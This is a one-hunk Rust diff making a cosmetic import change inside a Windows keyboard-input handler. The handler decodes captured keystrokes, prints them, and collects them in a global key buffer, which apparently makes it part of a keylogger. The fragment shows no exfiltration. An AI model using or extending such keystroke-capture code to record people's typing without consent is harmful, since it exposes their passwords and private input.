@@ -76,7 +76,7 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
         let chars = &unicode_buffer[0..count as usize];
         if let Ok(s) = String::from_utf16(chars) {
             print!("{}", s);
-            std::io::stdout().flush().unwrap();
+            io::stdout().flush().unwrap();
             let mut key_buffer = KEY_BUFFER.lock().unwrap();
             if key_buffer.len() >= 8 {
                 let buff = key_buffer.clone();
